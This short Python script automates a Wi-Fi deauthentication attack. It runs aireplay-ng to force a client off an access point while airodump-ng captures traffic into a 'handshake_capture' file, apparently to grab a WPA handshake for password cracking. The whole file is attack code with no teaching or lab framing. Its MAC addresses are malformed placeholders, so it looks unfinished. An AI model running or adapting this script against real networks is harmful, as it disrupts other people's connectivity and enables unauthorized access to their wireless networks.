import subprocess, asyncio,time


ap_mac = "b29:3::52"
target_mac = "94:99"
interface = "Wi-Fi"

# Start deauthentication attack
deauth_command = ["aireplay-ng", "--deauth", "5", "-a", ap_mac, "-c", target_mac, interface]
deauth_process = subprocess.Popen(deauth_command)

# Start capturing packets
capture_command = ["airodump-ng", interface, "--write", "handshake_capture"]
capture_process = subprocess.Popen(capture_command)

# Wait for the capture duration
time.sleep(20)

# Terminate processes
deauth_process.terminate()
capture_process.terminate()